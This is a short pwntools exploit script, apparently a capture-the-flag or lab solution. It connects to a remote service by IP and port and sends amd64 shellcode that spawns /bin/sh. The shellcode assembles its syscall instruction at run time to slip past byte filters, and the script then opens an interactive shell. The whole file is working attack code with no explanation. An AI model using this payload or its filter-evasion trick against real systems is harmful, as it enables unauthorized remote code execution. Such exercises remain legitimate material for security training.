from pwn import *

# r = process('./lab')
r = remote('10.113.184.121', 10042)
context.arch = 'amd64'


# payload = asm('''
#     mov rax, 0x68732f6e69622f
#     push rax
#     mov rdi, rsp
#     xor rsi, rsi
#     xor rdx, rdx
#     mov rax, 0x3b
#     mov rcx, 0x040e
#     add rcx, 0x0101
#     mov qword [rip-0x8], rcx
# ''')
payload = b'H\xb8/bin/sh\x00PH\x89\xe7H1\xf6H1\xd2H\xc7\xc0;\x00\x00\x00H\xc7\xc1\x0e\x04\x00\x00H\x81\xc1\x01\x01\x00\x00H\x89\r\x00\x00\x00\x00'
raw_input()
r.sendline(payload)

r.interactive()